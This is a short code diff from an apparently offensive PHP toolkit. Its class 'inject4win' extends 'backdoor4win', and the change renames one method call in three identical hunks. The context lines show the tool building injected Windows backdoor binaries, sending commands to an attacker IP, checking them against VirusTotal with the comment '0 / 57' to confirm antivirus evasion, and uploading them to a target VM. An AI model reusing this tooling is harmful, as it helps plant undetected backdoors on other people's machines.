@@ -59,7 +59,7 @@ class inject4win extends backdoor4win{
 		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
 		else $this->cmd($this->attacker_ip,$query);
 		$this->requette("du -b $this->source_bin $this->file_path");
-		$this->file_file2virus2vt(); // 0 / 57
+		$this->file2virus2vt(); // 0 / 57
 		$this->win2info();
 		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
 		return $this;
@@ -73,7 +73,7 @@ class inject4win extends backdoor4win{
 		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
 		else $this->cmd($this->attacker_ip,$query);
 		$this->requette("du -b $this->source_bin $this->file_path");
-		$this->file_file2virus2vt(); // 0 / 57
+		$this->file2virus2vt(); // 0 / 57
 		$this->win2info();	
 		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
 		return $this;
@@ -89,7 +89,7 @@ class inject4win extends backdoor4win{
 		if (! file_exists($this->file_path )) {$this->requette($query);$this->requette("sudo chown $this->user2local:$this->user2local $this->file_path " );}
 		else $this->cmd($this->attacker_ip,$query);
 		$this->requette("du -b $this->source_bin $this->file_path");
-		$this->file_file2virus2vt(); // 0 / 57
+		$this->file2virus2vt(); // 0 / 57
 		$this->win2info();
 		$vmx = new VM($this->target_vmx_name);$vmx->vm2upload($this->file_path, "$this->vm_tmp_win\\$this->file_ext");
 		return $this;
